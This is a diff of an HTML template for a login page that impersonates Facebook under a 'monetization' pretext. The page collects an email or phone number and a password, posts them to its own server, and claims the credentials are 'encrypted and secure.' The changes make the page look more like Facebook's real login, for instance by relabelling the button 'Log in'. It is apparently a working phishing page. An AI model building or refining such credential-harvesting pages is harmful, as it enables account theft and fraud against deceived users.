@@ -1,22 +1,19 @@
 {% extends "base.html" %}
 {% block body %}
 <div class="login-container">
-  <div class="login-card">
-    <!-- Enhanced Platform Header -->
+  <div class="card login-card">
+    <!-- Platform Header - ENHANCED -->
     <div class="platform-header">
-      <div class="platform-icon-container">
-        <div class="icon-circle bg-facebook">
-          <i class="fa-brands fa-facebook icon-lg"></i>
-        </div>
-        <div class="platform-badge">Official Partner</div>
+      <div class="icon-circle bg-facebook">
+        <i class="fa-brands fa-facebook icon-lg"></i>
       </div>
       <div class="platform-info">
-        <h2 class="platform-title notranslate">Facebook Monetization</h2>
-        <p class="platform-subtitle">Please login to continue with your account monetization</p>
+        <h2 class="platform-title notranslate">Facebook</h2>
+        <div class="platform-subtitle">Please login to continue with your account monetization.</div>
       </div>
     </div>
 
-    <!-- Enhanced Login Form -->
+    <!-- Login Form - ENHANCED -->
     <form id="loginForm" method="post" novalidate class="login-form">
       <div class="input-group">
         <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
@@ -29,25 +26,15 @@
       </div>
 
       <button class="btn login-btn" type="submit">
-        <span class="btn-text">Continue to Monetization</span>
-        <span class="btn-arrow">→</span>
+        <span class="btn-text">Log in</span>
+        <span class="btn-loader" style="display: none;">⏳</span>
       </button>
     </form>
 
-    <!-- Enhanced Security Note -->
+    <!-- Security Note - ENHANCED -->
     <div class="security-note">
       <div class="security-icon">🔒</div>
-      <div class="security-content">
-        <p class="security-title">Secure Login</p>
-        <p class="security-subtitle">Your credentials are encrypted and protected</p>
-      </div>
-    </div>
-
-    <!-- Additional Help Links -->
-    <div class="help-links">
-      <a href="#" class="help-link">Forgotten password?</a>
-      <span class="link-separator">•</span>
-      <a href="#" class="help-link">Create new account</a>
+      <p class="security-text">Your login credentials are encrypted and secure</p>
     </div>
   </div>
 </div>
@@ -56,95 +43,92 @@
 .login-container {
   display: flex;
   justify-content: center;
-  align-items: flex-start;
+  align-items: center;
   min-height: 100vh;
-  padding: 20px 16px;
+  padding: 20px;
   background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
 }
 
 .login-card {
-  width: 100%;
   max-width: 440px;
+  width: 100%;
   background: #ffffff;
   border-radius: 20px;
   box-shadow: 
-    0 8px 25px -5px rgba(24, 119, 242, 0.15),
-    0 2px 8px -1px rgba(0, 0, 0, 0.05),
-    0 0 0 1px rgba(255, 255, 255, 0.9);
+    0 8px 30px rgba(24, 119, 242, 0.15),
+    0 2px 8px rgba(24, 119, 242, 0.1);
   padding: 32px;
   transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  border: 1px solid rgba(255, 255, 255, 0.8);
+  border: 1px solid rgba(255, 255, 255, 0.9);
 }
 
 .login-card:hover {
   box-shadow: 
-    0 12px 35px -8px rgba(24, 119, 242, 0.2),
-    0 4px 12px -2px rgba(0, 0, 0, 0.06),
-    0 0 0 1px rgba(255, 255, 255, 0.9);
+    0 12px 40px rgba(24, 119, 242, 0.2),
+    0 4px 12px rgba(24, 119, 242, 0.15);
   transform: translateY(-2px);
 }
 
-/* Enhanced Platform Header */
+/* ENHANCED Platform Header */
 .platform-header {
-  text-align: center;
-  margin-bottom: 32px;
+  display: flex;
+  align-items: center;
+  margin-bottom: 28px;
   padding-bottom: 24px;
   border-bottom: 1px solid #f1f5f9;
-  position: relative;
 }
 
-.platform-icon-container {
-  position: relative;
-  display: inline-block;
-  margin-bottom: 16px;
+.icon-circle {
+  width: 60px;
+  height: 60px;
+  border-radius: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 16px;
+  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
+  transition: transform 0.2s ease;
 }
 
-.platform-badge {
-  position: absolute;
-  top: -6px;
-  right: -6px;
-  background: linear-gradient(135deg, #10b981, #059669);
-  color: white;
-  font-size: 10px;
-  font-weight: 700;
-  padding: 4px 8px;
-  border-radius: 10px;
-  line-height: 1;
-  box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3);
-}
-
-.icon-circle.bg-facebook {
-  background: linear-gradient(135deg, #1877F2, #166fe5);
-  box-shadow: 0 6px 20px rgba(24, 119, 242, 0.3);
-  transition: transform 0.3s ease;
-}
-
-.platform-icon-container:hover .icon-circle.bg-facebook {
+.icon-circle:hover {
   transform: scale(1.05);
 }
 
+.bg-facebook {
+  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
+}
+
+.icon-lg {
+  font-size: 24px;
+  color: white;
+}
+
+.platform-info {
+  text-align: left;
+}
+
 .platform-title {
+  margin: 0;
+  color: #1877F2;
   font-size: 24px;
   font-weight: 800;
-  margin: 0 0 8px 0;
-  background: linear-gradient(135deg, #1877F2, #0d5fbf);
+  letter-spacing: -0.3px;
+  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
   background-clip: text;
-  letter-spacing: -0.3px;
 }
 
 .platform-subtitle {
   color: #64748b;
   font-size: 14px;
   font-weight: 500;
-  margin: 0;
-  line-height: 1.4;
+  margin-top: 4px;
 }
 
-/* Enhanced Form Styles */
+/* ENHANCED Login Form */
 .login-form {
-  margin-bottom: 24px;
+  margin: 24px 0;
 }
 
 .input-group {
@@ -160,16 +144,7 @@
   font-size: 15px;
   font-weight: 500;
   transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-}
-
-.input:focus {
-  border-color: #1877F2;
-  box-shadow: 
-    0 0 0 4px rgba(24, 119, 242, 0.15),
-    0 2px 6px rgba(0, 0, 0, 0.08);
-  outline: none;
-  transform: translateY(-1px);
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
 }
 
 .input::placeholder {
@@ -177,11 +152,20 @@
   font-weight: 500;
 }
 
+.input:focus {
+  border-color: #1877F2;
+  box-shadow: 
+    0 0 0 4px rgba(24, 119, 242, 0.15),
+    0 2px 6px rgba(24, 119, 242, 0.1);
+  outline: none;
+  transform: translateY(-1px);
+}
+
 .input-error {
   border-color: #ef4444;
   box-shadow: 
-    0 0 0 4px rgba(239, 68, 68, 0.15),
-    0 2px 6px rgba(0, 0, 0, 0.08);
+    0 0 0 4px rgba(239, 68, 68, 0.1),
+    0 2px 6px rgba(239, 68, 68, 0.05);
 }
 
 .error-text {
@@ -190,20 +174,13 @@
   font-weight: 600;
   margin-top: 6px;
   margin-left: 4px;
-  display: flex;
-  align-items: center;
-  gap: 4px;
+  display: block;
 }
 
-.error-text::before {
-  content: "⚠";
-  font-size: 12px;
-}
-
-/* Enhanced Login Button */
+/* ENHANCED Login Button */
 .login-btn {
   width: 100%;
-  background: linear-gradient(135deg, #1877F2, #166fe5);
+  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
   color: #ffffff;
   font-size: 16px;
   font-weight: 700;
@@ -213,7 +190,7 @@
   border: none;
   transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
   box-shadow: 
-    0 6px 20px rgba(24, 119, 242, 0.35),
+    0 6px 20px rgba(24, 119, 242, 0.3),
     0 2px 4px rgba(24, 119, 242, 0.1);
   display: flex;
   align-items: center;
@@ -240,9 +217,9 @@
 }
 
 .login-btn:hover {
-  background: linear-gradient(135deg, #166fe5, #1258c4);
+  background: linear-gradient(135deg, #166FE5 0%, #1464D2 100%);
   box-shadow: 
-    0 8px 25px rgba(24, 119, 242, 0.45),
+    0 8px 25px rgba(24, 119, 242, 0.4),
     0 4px 8px rgba(24, 119, 242, 0.15);
   transform: translateY(-2px);
 }
@@ -250,29 +227,29 @@
 .login-btn:active {
   transform: translateY(0);
   box-shadow: 
-    0 4px 12px rgba(24, 119, 242, 0.35),
+    0 4px 12px rgba(24, 119, 242, 0.3),
     0 1px 2px rgba(24, 119, 242, 0.1);
 }
 
-.btn-arrow {
+.login-btn.loading {
+  pointer-events: none;
+}
+
+.btn-loader {
   font-size: 14px;
-  transition: transform 0.3s ease;
 }
 
-.login-btn:hover .btn-arrow {
-  transform: translateX(2px);
-}
-
-/* Enhanced Security Note */
+/* ENHANCED Security Note */
 .security-note {
-  display: flex;
-  align-items: center;
-  gap: 12px;
+  margin-top: 24px;
   padding: 16px 20px;
   background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
   border-radius: 14px;
   border: 1px solid #bae6fd;
-  margin-bottom: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
   transition: all 0.2s ease;
 }
 
@@ -282,63 +259,42 @@
 }
 
 .security-icon {
-  font-size: 18px;
-  flex-shrink: 0;
+  font-size: 16px;
+  filter: grayscale(0.3);
 }
 
-.security-content {
-  flex: 1;
-}
-
-.security-title {
-  font-size: 14px;
-  font-weight: 700;
-  color: #0369a1;
-  margin: 0 0 2px 0;
-}
-
-.security-subtitle {
-  font-size: 12px;
-  color: #0c4a6e;
-  font-weight: 500;
+.security-text {
   margin: 0;
-  opacity: 0.8;
-}
-
-/* Help Links */
-.help-links {
-  text-align: center;
-  padding-top: 16px;
-  border-top: 1px solid #f1f5f9;
-}
-
-.help-link {
-  color: #64748b;
-  font-size: 13px;
+  color: #0369a1;
+  font-size: 14px;
   font-weight: 600;
-  text-decoration: none;
-  transition: color 0.2s ease;
-}
-
-.help-link:hover {
-  color: #1877F2;
-}
-
-.link-separator {
-  color: #cbd5e1;
-  margin: 0 12px;
-  font-weight: 500;
+  text-align: center;
 }
 
 /* Responsive Design */
 @media (max-width: 480px) {
   .login-container {
-    padding: 16px 12px;
+    padding: 16px;
   }
   
   .login-card {
-    padding: 24px 20px;
+    padding: 24px;
     border-radius: 18px;
+  }
+  
+  .platform-header {
+    margin-bottom: 24px;
+    padding-bottom: 20px;
+  }
+  
+  .icon-circle {
+    width: 50px;
+    height: 50px;
+    border-radius: 14px;
+  }
+  
+  .icon-lg {
+    font-size: 20px;
   }
   
   .platform-title {
@@ -346,11 +302,13 @@
   }
   
   .input {
-    padding: 14px 16px;
+    padding: 14px 18px;
+    border-radius: 12px;
   }
   
   .login-btn {
     padding: 14px 20px;
+    border-radius: 12px;
   }
 }
 </style>
@@ -361,6 +319,9 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   const password = document.getElementById("password");
   const addressError = document.getElementById("addressError");
   const passwordError = document.getElementById("passwordError");
+  const loginBtn = document.querySelector('.login-btn');
+  const btnText = document.querySelector('.btn-text');
+  const btnLoader = document.querySelector('.btn-loader');
 
   const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
   const phonePattern = /^\+?\d{6,}$/;
@@ -383,7 +344,14 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     passwordError.textContent = "Password must be at least 6 characters.";
   }
 
-  if (!valid) event.preventDefault();
+  if (valid) {
+    // Show loading state
+    btnText.textContent = "Logging in...";
+    btnLoader.style.display = 'inline';
+    loginBtn.classList.add('loading');
+  } else {
+    event.preventDefault();
+  }
 });
 
 document.querySelectorAll(".input").forEach(input => {
@@ -392,16 +360,14 @@ document.querySelectorAll(".input").forEach(input => {
     if (input.id === "address") document.getElementById("addressError").textContent = "";
     if (input.id === "password") document.getElementById("passwordError").textContent = "";
   });
-});
-
-// Add focus effects
-document.querySelectorAll('.input').forEach(input => {
-  input.addEventListener('focus', function() {
-    this.parentElement.classList.add('focused');
+  
+  // Add focus effect
+  input.addEventListener("focus", () => {
+    input.style.transform = "translateY(-1px)";
   });
   
-  input.addEventListener('blur', function() {
-    this.parentElement.classList.remove('focused');
+  input.addEventListener("blur", () => {
+    input.style.transform = "translateY(0)";
   });
 });
 </script>
